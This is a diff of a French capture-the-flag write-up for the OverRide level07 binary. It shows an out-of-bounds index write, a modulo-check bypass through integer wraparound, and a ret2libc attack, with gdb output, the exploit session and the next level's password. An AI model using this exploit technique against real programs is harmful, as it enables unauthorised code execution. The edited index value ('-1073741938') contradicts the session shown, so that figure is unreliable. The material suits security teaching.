@@ -3,41 +3,22 @@
 Ce programme permet de d'effectuer 3 actions.
 store, read, quit.
 
-Store permet de stocker un nombre et de le mettre a un certaine index.
+- Store permet de stocker un nombre et de le mettre a un certaine index.
 
-Read permet de lire ce qui se trouve a l'index donne.
+- Read permet de lire ce qui se trouve a l'index donne.
 
-Quit permet de quitter le programme.
+- Quit permet de quitter le programme.
 
 Tout d'abord, on remarque que argv et envp (variables d'environnements) sont mis a 0. Cela signifie qu'il est impossible de mettre un payload dans une variable d'environnement.
-```
- 0x080487a7 <+132>:	mov    0x1c(%esp),%eax
-   0x080487ab <+136>:	mov    (%eax),%eax
-   0x080487ad <+138>:	movl   $0xffffffff,0x14(%esp)
-   0x080487b5 <+146>:	mov    %eax,%edx
-   0x080487b7 <+148>:	mov    $0x0,%eax
-   0x080487bc <+153>:	mov    0x14(%esp),%ecx
-   0x080487c0 <+157>:	mov    %edx,%edi
-   0x080487c2 <+159>:	repnz scas %es:(%edi),%al
-   0x080487c4 <+161>:	mov    %ecx,%eax
-   0x080487c6 <+163>:	not    %eax
-   0x080487c8 <+165>:	lea    -0x1(%eax),%edx
-   0x080487cb <+168>:	mov    0x1c(%esp),%eax
-   0x080487cf <+172>:	mov    (%eax),%eax
-   0x080487d1 <+174>:	mov    %edx,0x8(%esp)
-   0x080487d5 <+178>:	movl   $0x0,0x4(%esp)
-   0x080487dd <+186>:	mov    %eax,(%esp)
-   0x080487e0 <+189>:	call   0x80484f0 <memset@plt>
-   0x080487e5 <+194>:	addl   $0x4,0x1c(%esp)
-   0x080487ea <+199>:	mov    0x1c(%esp),%eax
-   0x080487ee <+203>:	mov    (%eax),%eax
-   0x080487f0 <+205>:	test   %eax,%eax
-   0x080487f2 <+207>:	jne    0x80487a7 <main+132>
-```
+
+	for (int i = 0; argv[i]; i++)
+        memset(argv[i], 0, strlen(argv[i]));
+    for (int i = 0; env[i]; i++)
+        memset(env[i], 0, strlen(env[i]));
 
 Ensuite, on voit que pour stocker les nombres, le programme utilise un buffer de 100 int (voir source).
 
-On remarque apres quelques tests  qu'il n'y a aucuns tests fait sur l'index entre en input (voir source).
+On remarque apres quelques tests  qu'il n'y a aucuns tests fait sur l'index entree en input (voir source).
 
 On peut donc trouver un moyen d'ecrire sur eip. Il nous faut donc trouver a quel endroit de la stack est stocker eip et a quel index de notre buffer cela correspond.
 Ca ressemble un peu a la faille vulnerabilite de format de printf.
@@ -45,156 +26,161 @@ Ca ressemble un peu a la faille vulnerabilite de format de printf.
 D'abord on doit determiner l'endroit ou commence notre tableau d'int.
 
 On peut mettre des valeurs dans les premiers index de notre tableau et ensuite afficher la stack:
-```
-----------------------------------------------------
-  Welcome to wil's crappy number storage service!   
-----------------------------------------------------
- Commands:                                          
-    store - store a number into the data storage    
-    read  - read a number from the data storage     
-    quit  - exit the program                        
-----------------------------------------------------
-   wil has reserved some storage :>                 
-----------------------------------------------------
+	
+	----------------------------------------------------
+	Welcome to wil's crappy number storage service!   
+	----------------------------------------------------
+	Commands:                                          
+		store - store a number into the data storage    
+		read  - read a number from the data storage     
+		quit  - exit the program                        
+	----------------------------------------------------
+	wil has reserved some storage :>                 
+	----------------------------------------------------
 
-Input command: store 
- Number: 1
- Index: 0
- *** ERROR! ***
-   This index is reserved for wil!
- *** ERROR! ***
- Failed to do store command
-Input command:
-```
+	Input command: store 
+	Number: 1
+	Index: 0
+	*** ERROR! ***
+	This index is reserved for wil!
+	*** ERROR! ***
+	Failed to do store command
+	Input command:
+	
 En voulant mettre 1 a l'index 0 on obtient une erreur. Cela est du au faite qu'il y a un check sur l'index dans la fonction store_number:
-```
-if (index % 3 == 0 || number >> 24 == 183)
-```
+	
+	if (index % 3 == 0 || number >> 24 == 183)
+	
 Ce check nous explique d'ecrire dans toutes les cases du tableau.
 
 On met une valeur dans l'index 1 et l'index 2 et on affiche la stack:
-```
-Input command: store 
- Number: 1
- Index: 1
- Completed store command successfully
-Input command: store 
- Number: 2
- Index: 2
- Completed store command successfully
-Input command: read
+	
+	Input command: store 
+	Number: 1
+	Index: 1
+	Completed store command successfully
+	Input command: store 
+	Number: 2
+	Index: 2
+	Completed store command successfully
+	Input command: read
 
-Breakpoint 2, 0x080486dd in read_number ()
-(gdb) x/200wx $esp
-0xffffd4f0:	0xffffd6dd	0x08048d60	0xffffd708	0xf7e2b6c0
-0xffffd500:	0xf7fcfa20	0x08048d4b	0xffffd524	0xffffd544
-0xffffd510:	0xffffd6dd	0x08048d60	0xffffd708	0x08048930
-0xffffd520:	0xffffd544	0x00000014	0xf7fcfac0	0xf7fdc714
-0xffffd530:	0x00000098	0xffffffff	0xffffd7fc	0xffffd7a8
-0xffffd540:	0x00000000	0x00000000	0x00000001	0x00000002
-0xffffd550:	0x00000000	0x00000000	0x00000000	0x00000000
-```
+	Breakpoint 2, 0x080486dd in read_number ()
+	(gdb) x/200wx $esp
+	0xffffd4f0:	0xffffd6dd	0x08048d60	0xffffd708	0xf7e2b6c0
+	0xffffd500:	0xf7fcfa20	0x08048d4b	0xffffd524	0xffffd544
+	0xffffd510:	0xffffd6dd	0x08048d60	0xffffd708	0x08048930
+	0xffffd520:	0xffffd544	0x00000014	0xf7fcfac0	0xf7fdc714
+	0xffffd530:	0x00000098	0xffffffff	0xffffd7fc	0xffffd7a8
+	0xffffd540:	0x00000000	0x00000000	0x00000001	0x00000002
+	0xffffd550:	0x00000000	0x00000000	0x00000000	0x00000000
+	
 On voit bien un 1 et un 2 qui se suivent dans la stack. Donc le debut du buffer est:
-0xffffd544.
+
+	0xffffd544.
 
 Maintenant en mettant un breakpoint a l'endroit ou le programme appel la fonction read_number on peut trouver eip:
-```
-Breakpoint 1, 0x0804892b in main ()
-(gdb) info frame
-Stack level 0, frame at 0xffffd710:
- eip = 0x804892b in main; saved eip 0xf7e45513
- Arglist at 0xffffd708, args: 
- Locals at 0xffffd708, Previous frame's sp is 0xffffd710
- Saved registers:
-  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
-(gdb)
-```
+	
+	Breakpoint 1, 0x0804892b in main ()
+	(gdb) info frame
+	Stack level 0, frame at 0xffffd710:
+	eip = 0x804892b in main; saved eip 0xf7e45513
+	Arglist at 0xffffd708, args: 
+	Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+	Saved registers:
+	ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
+	(gdb)
+	
 L'endroit ou est stocker eip est: 0xffffd70c.
 Maintenant pour trouver ou il est stocker on fait:
-0xffffd70c - 0xffffd544 = 456
+
+	0xffffd70c - 0xffffd544 = 456
+
 Vu qu'on est sur un tableau d'int on fait 456 / 4 = 114.
 
 Si on fait un read de l'index 114:
-```
-Index: 114
- Number at data[114] is 4158936339
- Completed read command successfully
- ```
- En hexa cela donne: 0xF7E45513 qui est bien l'adresse de retour du main.
+	
+	Index: 114
+	Number at data[114] is 4158936339
+	Completed read command successfully
+	
+En hexa cela donne: 0xF7E45513 qui est bien l'adresse de retour du main.
 
- Maintenant qu'on sait ou se trouve eip on peut faire un ret2libc.
+Maintenant qu'on sait ou se trouve eip on peut faire un ret2libc.
+Le probleme est qu'on ne peut pas ecrire a l'index 114 a cause du if % 3.
+Pour bypasser cela on peut utiliser la formule:
 
- Le probleme est qu'on ne peut pas ecrire a l'index 114 a cause du if % 3.
+	(UINTMAX + 1) / 4 + 114
+	4294967296 / 4 + 114
 
- Pour bypasser cela on peut utiliser la formule:
- (UINTMAX + 1) / 4 + 114.
- Ce qui nous donne: 1073741938.
+Ce qui nous donne:
 
- On peut maintenant ecrire au bon index.
+	-1073741938
 
- On recupere l'adresse de system et de /bin/sh:
- ```
- (gdb) p system
-$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
-(gdb) info proc map
-process 1845
-Mapped address spaces:
+On peut maintenant ecrire au bon index.
+On recupere l'adresse de system et de /bin/sh:
+	
+	(gdb) p system
+	$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+	(gdb) info proc map
+	process 1845
+	Mapped address spaces:
 
-	Start Addr   End Addr       Size     Offset objfile
-	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
-	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
-	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
-	0xf7e2b000 0xf7e2c000     0x1000        0x0 
-	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
-	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
-	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
-	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
-	0xf7fd0000 0xf7fd4000     0x4000        0x0 
-	0xf7fd8000 0xf7fdb000     0x3000        0x0 
-	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
-	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
-	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
-	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
-	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
-(gdb) find 0xf7e2c000, 0xf7fcc000,"/bin/sh"
-0xf7f897ec
-1 pattern found.
-```
+		Start Addr   End Addr       Size     Offset objfile
+		0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
+		0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
+		0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
+		0xf7e2b000 0xf7e2c000     0x1000        0x0 
+		0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+		0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+		0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+		0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+		0xf7fd0000 0xf7fd4000     0x4000        0x0 
+		0xf7fd8000 0xf7fdb000     0x3000        0x0 
+		0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+		0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+		0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+		0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+		0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+	(gdb) find 0xf7e2c000, 0xf7fcc000,"/bin/sh"
+	0xf7f897ec
+	1 pattern found.
+	
 
 On passe maintenant les 2 adresses en decimal:
 
-system: 0xf7e6aed0 = 4159090384
-/bin/sh: 0xf7f897ec = 4160264172.
+	system: 0xf7e6aed0 = 4159090384
+	/bin/sh: 0xf7f897ec = 4160264172.
 
 Maintenant on test:
-```
-level07@OverRide:~$ ./level07
-----------------------------------------------------
-  Welcome to wil's crappy number storage service!   
-----------------------------------------------------
- Commands:                                          
-    store - store a number into the data storage    
-    read  - read a number from the data storage     
-    quit  - exit the program                        
-----------------------------------------------------
-   wil has reserved some storage :>                 
-----------------------------------------------------
+	
+	level07@OverRide:~$ ./level07
+	----------------------------------------------------
+	Welcome to wil's crappy number storage service!   
+	----------------------------------------------------
+	Commands:                                          
+		store - store a number into the data storage    
+		read  - read a number from the data storage     
+		quit  - exit the program                        
+	----------------------------------------------------
+	wil has reserved some storage :>                 
+	----------------------------------------------------
 
-Input command: store
- Number: 4159090384
- Index: 1073741938
- Completed store command successfully
-Input command: store
- Number: 4160264172
- Index: 116
- Completed store command successfully
-Input command: quit
-$ ls
-ls: cannot open directory .: Permission denied
-$ cd ../level08
-$ cat .pass
-7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
-```
+	Input command: store
+	Number: 4159090384
+	Index: 1073741938
+	Completed store command successfully
+	Input command: store
+	Number: 4160264172
+	Index: 116
+	Completed store command successfully
+	Input command: quit
+	$ ls
+	ls: cannot open directory .: Permission denied
+	$ cd ../level08
+	$ cat .pass
+	7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+	
 
 Success!!!
 
